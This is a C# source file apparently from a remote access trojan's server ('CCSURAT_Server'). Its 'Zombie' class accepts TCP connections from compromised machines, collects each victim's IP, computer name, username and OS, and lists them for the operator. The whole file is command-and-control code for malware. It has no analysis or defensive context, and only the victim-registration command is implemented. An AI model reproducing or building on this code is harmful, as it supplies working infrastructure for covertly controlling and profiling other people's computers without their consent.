using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Windows.Forms;

namespace CCSURAT_Server
{
    class Zombie
    {
        // Store a copy of the main form for logging
        // also store the listview to add clients to it.
        private ServerMainForm mainForm;
        private ListView zombieListView;
        private ListViewItem zombieItem;

        private TcpClient client;
        private NetworkStream netStream;

        #region information
        private string IP, computerName, username, OS;
        #endregion
        public Zombie(ServerMainForm form, TcpClient client)
        {
            this.mainForm = form;
            this.zombieListView = mainForm.zombieListView;
            this.client = client;
            this.netStream = client.GetStream();
            this.SendData("[[START]][[/START]]");
            Console.Beep();
        }
        public void ListenForData()
        {
            try
            {
                while (IsAlive())
                {
                    if (netStream.DataAvailable)
                    {
                        byte[] bytes = new byte[1024];
                        string data = null;
                        int i;
                        if ((i = netStream.Read(bytes, 0, bytes.Length)) != 0)
                        {
                            // convert recieved bytes to string data
                            data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                            Log("Data recieved: " + data);
                            HandleData(data);
                        }
                        Application.DoEvents();
                    }
                }
                Log("Client was closed");
            }
            catch (Exception ex)
            {
                Log("Stream lost connection: " + ex.Message);
            }
            finally
            {
                // remove entry from listview if connection is lost/closed
                RemoveFromListView();
            }
        }

        // checks if connection is still alive with client.
        private Boolean IsAlive()
        {
            try
            {
                // write empty buffer to client to check if connection is alive
                byte[] empty = new byte[1];
                netStream.Write(empty, 0, 0);
                return true;
            }
            catch (SocketException ex)
            {
                // Send buffer is full, but still connected to client.
                if (ex.NativeErrorCode.Equals(10035))
                    return true;
                else
                {
                    return false;
                }
            }
        }

        // Handle data received from clients.
        private void HandleData(string data)
        {
            try {
                // Seperate the command and data
                string command = GetCommand(data);
                data = RemoveCommand(data);

                switch (command)
                {
                    case "START":
                        ParseSystemInfo(data);
                        AddToListView();
                        break;
                }
            }
            catch(Exception ex)
            {
                // Data without proper command tag was received.
                Log("Could not handle data: " + data);
            }
        }

        // Gets command tag
        private string GetCommand(string text)
        {
            text = text.Substring(2, text.IndexOf("]") - 2);
            return text;
        }

        // Removes command tag from data
        private string RemoveCommand(string data)
        {
            data = data.Substring(data.IndexOf("]]") + 2);
            data = data.Substring(0, data.LastIndexOf("[") - 1);
            return data;
        }

        // write data to client
        public void SendData(string s)
        {
            try {
                // convert string data to byte array and write it to the stream
                byte[] data = System.Text.Encoding.ASCII.GetBytes(s);
                netStream.Write(data, 0, data.Length);
                Log("Data sent: " + s);
            } catch(Exception ex)
            {
                Log("Error sending data: " + ex.ToString());
            }
        }


        private void AddToListView()
        {
            // handle cross-thread call.
            if (zombieListView.InvokeRequired)
            {
                zombieListView.Invoke(new Action(AddToListView));
                return;
            }

            // add stored client information to listview.
            zombieItem = new ListViewItem();
            zombieItem.Text = IP;
            zombieItem.SubItems.Add(computerName);
            zombieItem.SubItems.Add(username);
            zombieItem.SubItems.Add(OS);
            zombieListView.Items.Add(zombieItem);
        }

        private void RemoveFromListView()
        {
            if (zombieListView.InvokeRequired)
            {
                zombieListView.Invoke(new Action(RemoveFromListView));
                return;
            }
            zombieListView.Items.Remove(this.zombieItem);
        }

        // Parse the data and set the client's system info
        private void ParseSystemInfo(string data)
        {
            // The IP is taken serverside by using the first part of RemoteEndPoint
            // which is the endpoint of the socket connection.
            EndPoint temp = client.Client.RemoteEndPoint;
            IP = temp.ToString().Substring(0, temp.ToString().IndexOf(":"));

            // The rest of the information is what was sent by the client.
            // Each piece of system info is seperated by: |*|
            string[] info = data.Split("|*|".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
            computerName = info[0];
            username = info[1];
            OS = info[2];
        }

        private void Log(string s)
        {
            mainForm.Log(s);
        }
    }
}
